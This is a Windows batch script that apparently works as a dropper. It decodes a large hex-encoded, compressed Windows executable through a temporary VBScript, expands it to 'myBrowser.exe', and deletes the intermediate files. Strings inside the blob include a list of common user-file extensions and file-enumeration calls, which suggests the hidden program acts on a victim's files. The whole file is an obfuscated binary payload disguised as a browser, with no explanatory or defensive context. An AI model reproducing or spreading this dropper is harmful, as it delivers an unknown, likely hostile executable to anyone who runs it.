@echo off

:compressedcmp
For %%b In (
    "535A444488F02733410001002200FF4D5A9000030000007D04F5F0FFFF0000B8F5F0A201014001040F0D1C0980F5F00EFF1FBA0E00B409CD21FFB8014CCD2154"
    "6869FF732070726F677261FF6D2063616E6E6F74FF2062652072756E20FF696E20444F53206DFF6F64652E0D0D0A24FE0104504500004C0103DF00603FC4531C"
    "05E000FF02010B010800001A5AF5F00601033E39F5F02005050408009D0102F6F30101B0052B02AD00FE010103004085000010F0D002D007DB060102E8380000"
    "E47B020800A0C504011A600000010C011D241D341D01019D008A003916F5089D004839182E7465780D74F5F044199A048D01FD0C9D003F602E72737263F5F0FC"
    "02E40801F8F11C391B0800402E7207656C6F941014121110C4029D018AA91B42391D209901F5F05C1102FF000500B8270000300F11000001F5F008209104152D"
    "7C252D30271B3004001DAD00EE0820110073F8F00A0A06EB28054F206F91000A0006D7176F075B21738A000A0BD50754230963220A4F200C08DE6E28160D38C7"
    "08210209BB9A72082070280B4F202DF112932174209A2316FE012BFF0116130411042D497E8F00020917589A6F14107E7A20DE11260006727110D970C3258F00"
    "6F0D4F2017FEA901AF20B5220EDD200E4F20289D0FC522003850082093214178982BBA20A92D2D2B0007BE22ED286220066FD2000A0007CEDF2226076F0520F6"
    "2538FD4A902455982B5D183DB722082E3DDD08DF2333130846326F128A703202AF2217EA249A33F7268CAA90246998262193216F982B7BBC6B3DB72055007281"
    "982113AE5B217220010346C10D47A86D020346970403465C050346C5F73946288A009101BF200D09DF028E69FE04B5213A2ACFFEFFFF2A0921D5027000EF1080"
    "00110820011E02FB28144F202A1330050064F100AC01117D43AB00037DF8F0EF0402047DF4F0040205D97D0820A540178DF320010AFF06161F7C9D066F15924F"
    "207DAD028340011312F4F011F700027B9B410A2B0006C0C74DA241DB4DD341A941F344050079A3A9414921140A73166921F702178D7A2001130911FF09167233"
    "060070A2A62E506F177B218B20C5541209FD9AAF43130A110A161F4F3D9D110ABC42B521174A5AFD2C5856051104169A72F9393350EE35130B110B2DFF410016"
    "13062B2A00BF110511069A28742006DF13071107148C540B00F6A6506F18F923110617583F1306110611055B428F51AFC8002B327D524D835D1BEF0007726133"
    "50110517BF9A1105169A73F4F006F4B655554208C8553A2CFFFFF5FF8B2083010106130C1CF62757110C36501707096FEA71100A5421063650187271E2335319"
    "3765910042611A727BEA33531B506C288D000A0A0977076F1BE12159FE048B5526EF207285DB51A5100A7A205542F47F6310646B18600613082BBF0011082A00"
    "1341207AFCF5F055201100160A2B66FB001D27520B071672892E335107177E7F40049E50F8F0BF06A20718728FDD62196CE3653F62071A4763071BE3651E5862"
    "071C7297DD6278620543CE5E20580A06E3625B410C08FB2D8C684013300300431C8E03CB622A0002E369EE354170BB0B00E3640B2B17327D084F2DC8140B2B30"
    "BE6304AD006E622011729B335072A3A671E9B73350FB528055200472BBCAA671C3A671F1B0769100047285F7A671FFA671D771B37362200417722F07A77037F1"
    "71F071B3732E8A0004724DF17155F1710981ECB37374200472612070727770F1712281B3737A200472ABF171E1B3F1713B81B3739C200472E5C2F171EDF17154"
    "81B373141004720B1708A7701F6E816D81B373E020170472416E81496E818681B3732EF3200472796E81816E819F815CB373F8200472BF6E81C76E81B8B881B3"
    "73D2000472E76E81EFF06E81D181B373052004720509C2A7700DEB81EA81B373A1300472852DEB8135EB810391B373064004571F0F8DF4F002B5407EB971EFA2"
    "06177ED271A20618BD7EEB71A206197E0481A2F7061A7E1D81A2061B7EDE3681A2061C7E4F81A2067B1D7E6881A2061E7E81819FA2061F097E9A816A900A997E"
    "B3816A900B7ECC816A900C997EE5816A900D7EFE816A900EDD7E1791A20680E4612A42CF534A4201072212137632FF2E302E3530373237CE010105006C9A01F4"
    "F0237ED700008CF4F028CD9153745F72696E67730101B491007D6074202355530014D2045F2347554944F5F024D2007D0C082023426C6F620104DE4521571502"
    "08742000000FFA01330020500821D501F4F1807F400363A214F4F162200725C4040ABEAD94060036002F90000BEB01EB90002B6FA251012FFE5C207E01690106"
    "0092BA7BA2DC81A00A00EB8DA20BAD0282A11A027CA13D99A00AEB004A99A2739FA00600AEFEB1A2E202C7020600E9109FA00101AE93AC931028A1FD10D0A5D4"
    "A511DCA10307204837A00100574C0017072051F3A25D37A05F160062001B28A0660BB2556A0BB26E0BB2720BB2760BB2557A0BB27E0BB2820BB2860BB2558A0B"
    "B28E0BB2920BB2960BB27D9A0BB29E001F0050CD12B796003D5DA28C22010186BB1842D10002009477B624FAAC00D877B29600A6002BEAFD10F093B4AE9BB006"
    "000875236AB3BD9BB0070020AFB4D7CA00314B10D068029600BDD367A0090058256AB3E0EB003A3FA0A8D9B29118203B0336FA22010064784103B072AB0151C9"
    "025C110100B94522BA10C9BE45221A0311DE1040BB0019DE1010002131C229BE31C231009E014A3BC0B3FB014E3BC0C401530039AE31C24100F64BC04931C251"
    "EF002102583BC02D024EBF00590057025E3BC062FF02630069007B0267BA59C0816FC041008C7BC051AF0099026C7DC0A481C0094E61C4B3027B13109EC59213"
    "10B7FC029B131103A1FDA009BB03A7131010036CBFC2ADFE9C001B0045002E000BBB00E2D7C01300EB714082FF008700B300CE00D53F00DC008B00042C01F6CA"
    "39490131F6C801002613A50DD8FD69AE9300003C4D6F64FF756C653E0062726FFF777365722E657865FF0064756D6D790045FF7874656E73696F6EFF006D7363"
    "6F726C69FF620053797374656DFF004F626A65637400FF4D61696E002E6374E76F72006A116A107300647F6573637269707456D1FF6E616D6500616C6CFF0073"
    "767A00617669BF00626174006273D066FF6C76006769660069FF6E69006A6172006DFF7033007064660070EF6E6700746B10746D70FF007A6970004C69737B74"
    "4197D04765744E92D1E2DAD04486D8DAD050D7546F46FF696C746572004469DF73706C6179D2D173007F436865636B4578D3D0FE62D42E52756E74696DFF652E"
    "436F6D70696CFF6572536572766963E96512E02FE2618CD152656CBB617845E2734174DE90628F7574650026E42EE145E0629F696C69747955E73ED400FF5354"
    "415468726561CD6455E76172E2901FE45769FB6E6440D02E466F726DFF7300466F6C646572FD423FD34469616C6F67FF00456E7669726F6EFF6D656E74006765"
    "74DF5F43757272CEE044697D726DD06F72790073D3E0F753656C6DD065645061FB7468E6E3686F774E65DD77B2E475747457D04F708B656E00E065BFE414F8E7"
    "E149E76E6974C0E0DDE7536176F96514F8DD93006F705F45877175616FE1E6E2E5D92EE06DF36F6EBFE4BFE352657375416C1DE0FDE0BFE4D2E1EBEA4352E07F"
    "6F6C65005772695CE0C0E7E100E4D2E114F1DDD2D2E14C65F36E67F5E0AFF24C696E65CC13E0B7D053706FE0B1D07074DE4FD1496E70751DE6436FF96CEDE151"
    "E12E47656E6537726963D1D260314DF4E7F27D4F8BD27300416464D1E2494966D1A7F063A3D0D2E26F27E04CECF1F8F02E6377D29E702F0FB0FADB300F5E036C"
    "00640065EE21B00027446F00660061CB0075C790749C006E017300456321B0697140EBF061006E5B044ACC300B9E036C6F005C017327B0EAA401737B0076AD01"
    "052F009568A302686F006C7140C4013F5F0000809D4321B0E96F0055207D006EE402626100EE8100A8E5016E018401697B006C610067547D00E5017061007521"
    "B020161209768D021B1520BB022111CBF07B00A9726D04E703209F0263C700692A6F022F4A146461007389005913B92E5C205EA0809F20CC106D2B0079DE1072"
    "61007789004513395B69A0A00120007CCC10A607495D5C207E1562871D97126F9D18006A07AE19861D9611B4019E15BC056A300B80E5771155930294C1BC0194"
    "0544FB05A607206F0082050E2920E1B070E81DC01D45250C2D2000227B0045646D007021B088014D213DBD025769002C81007881003BD1C0AAA323637D007381"
    "006F6C203D2A09B0690C102CD5C061D1C03D11D16D87024F13AC0173A020008113ED0AA22D81023AE6022527E505281311AB27F3212827B06F26147CC1152D85"
    "04731612733BC00635CF29481A336E01A0016E9B12E90565C02211651BB06D113523706F025E318FD05006122B21E3017511536E206E81004161C0206123C72D"
    "D723983D6EBC2004860D96032ED1C023294519A125CF290922121A551161CE22EB030643963D149801F321E0DB326A1612F7017313215416128E43B0313111E9"
    "D3003F11A44513FB23208732D321727D0063D03028B4439F21C52122D7C0018003C30AF7A06C4D7C492039E301F32101647B00824359292D1341297923C00120"
    "CE318643A803CE41BA4B746E20AC31902553E501511B84476650167113010380991F2D2F2DD61D632D732BDC5D09225FC0A031E96C56624B0C4DC6415E7CC122"
    "00013B77114CC55220F709D521D121BE47363D3AC300C521CB0013083D749366CF29000FAC82337C05000944312AD7C0003309299F10D262037CC300F0513B00"
    "071A33000329AF00071166C8901341F962F529000345707D07B4017A00002D375530415A8F025031D721A925792164F42AC70105371B71F760B921002F0941B8"
    "224B216E2B726E013E71B921D86E01D01108780762C9520015C142C9525511F5278A7188310019294287323F11797D7C66C790B6000B3346C7906135609C7164"
    "7D747DFA8475677DC06600003147880982DC318A316DC9523C731C8367588A568475883300291A61699302D0BA339CD0CB5880796A3E120021A94ABD02E72161"
    "E3C070C3526356C958000730713359704D9F8220DE7DF251D12153117E7B706D000C802B3D50610072CF32624624671180CF21EF215B536001B8D0C952C88D6E"
    "0E0C10001F501D92288D8277BF23C7001554FE44369D3071001FA04C913071E081B87D88717A8F0200F129247D347D0A76005D017BFF3F78582D4B911F33FF27"
    "BF234E850008B77F7A5C561934E089EAA0FF011D0E0320000102EF060E0306DA9006120CFF04061D120C0620032F010E0E0EEAA00EE990F890F50E34A001EAA0"
    "120C0E041F200101080450A134A00BA27E0BA202050002020E0BA057001131DC900EFD9001DB91FF080A07051215121DBF122508020620D9901DFF030407011D"
    "030307BF010E0615123D08A0087B20024AA00E1141050DA02913E4606AA008F7911DF69027A0DF0E1A070D0E58A31D0EE50861A10809A04AA1020E06EB07038B"
    "A0029AA1120C0249054FA05CA001C7B02ED11ED0A1FF540216577261704E3F6F6E457863658BD288E02C40D02DD01039F6C72ED9A169B2E0EDADE7A0D9A82ED3"
    "4700724578796571D25AD265652E6497D03E2ED1FF2500204002BD42BD0052BD62BD72BD82BD92BDA2BDB2BDC2BD28D2BDE2BD0BDA1013A018DB00F0BD722DD1"
    "3005CD17C200004813A0755832B0441ED844023413A07556C9305F4DC0450052C9305F49004F004E51C0495FC079465DC02ED1BD04EFFE2CC58878C9DA002ED2"
    "042BC63EC813D256423E1246A9041A61600213A0248FC2C1547392A031D67194062ED2B00405A42DD001C930CE4188311DF0B1CD2B0080E9C23011D634B9101C"
    "C002BC2002A7C0FAC57601366DDEC3E9A14930B0A028D756AD34DAC73099403E70D7000038000CA7C01A61549443B8334EEC2400B91C2EFE42E29CD12825D2F7"
    "413D116C0043126100707E508E0167C700A660E8A2254081D24FCFD4B4736CF9C6B831549ADDAADB3451D250722264D144545EDD70DD3851D241A5946DE78200"
    "7A9134ED44ED8BED9BEDABEDBBEDCBED00DBEDEBEDFBED0BFD1BFD2BFD3BFD4BFD005BFD6BFD7BFD8BFD9BFDABFDBBFDCBFD00DBFD6BD481D0DED001BD080D18"
    "0D280D00380D480D580D680D780D880D980DA80D00B80DC80DD80DE80DF80D081D181D281D00381D481D581D681D781D881D981DA81D00B81DC81DD81DDDA4"
) Do >> "$" (Echo.For b=1 To len^(%%b^) Step 2
Echo WScript.StdOut.Write Chr^(Clng^("&H"^&Mid^(%%b,b,2^)^)^) : Next)
Cscript /b /e:vbs "$" > "compressed.cmp"
Del /f "$"
expand compressed.cmp myBrowser.exe
del compressed.cmp
Goto :EOF